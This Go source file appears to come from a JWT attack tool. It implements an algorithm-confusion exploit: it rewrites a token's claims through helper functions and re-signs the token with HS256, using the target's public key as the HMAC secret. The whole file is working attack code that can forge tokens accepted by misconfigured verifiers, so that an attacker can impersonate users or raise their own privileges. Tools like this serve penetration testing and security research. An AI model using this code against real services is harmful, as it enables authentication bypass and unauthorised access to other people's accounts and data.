package app

import (
	"fmt"
	"strings"

	"github.com/golang-jwt/jwt/v5"
)

// ConfusionAttack re-signs the token with an HMAC algorithm using pubKey as the secret.
// alg defaults to HS256 when empty (typical algorithm-confusion target).
func ConfusionAttack(token *jwt.Token, pubKey []byte, customClaims map[string]string, deleteClaims []string, claimsJSON, alg string) (*jwt.Token, string, error) {
	claims, err := TamperClaims(token, customClaims, deleteClaims, claimsJSON)
	if err != nil {
		return nil, "", fmt.Errorf("tampering claims: %w", err)
	}

	if strings.TrimSpace(alg) == "" {
		alg = "HS256"
	}
	method, err := ResolveSigningMethod(alg, nil)
	if err != nil {
		return nil, "", fmt.Errorf("resolving algorithm: %w", err)
	}

	newToken := jwt.NewWithClaims(method, claims)

	signedToken, err := newToken.SignedString(pubKey)
	if err != nil {
		return nil, "", fmt.Errorf("signing token: %w", err)
	}

	newToken.Raw = signedToken
	return newToken, signedToken, nil
}
